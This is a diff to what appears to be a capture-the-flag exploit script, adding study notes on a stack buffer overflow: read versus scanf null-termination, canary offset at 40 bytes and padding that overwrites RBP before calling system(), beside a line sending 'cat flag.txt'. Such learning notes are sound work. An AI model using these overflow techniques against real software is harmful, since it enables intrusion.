@@ -65,6 +65,17 @@ for i in range(5):
     p.sendline(b'cat flag.txt')
     print(p.recv())
 
+# demo prob:
+# what is different between read and scanf?
+# read: read bytes and store in buffer
+# scanf: read bytes and store in buffer, but it will append '\x00' at the end of buffer
+
+# Note:
+# input buffer size = 32
+# input + 40 = canary
+# payload = b'A' * 32 + temp != b'A' * 40
+# 是因為 temp 的 8 byte 會被填入 RBP, system() 會檢查 RBP, 所以不能填入 8 byte 的 b'A' （會 BUS ERROR）
+
 # -------------------------------------
 # 0x7ffe449919e0(+0)  -> input[0x20]
 # 0x7ffe44991a08(+40) -> canary
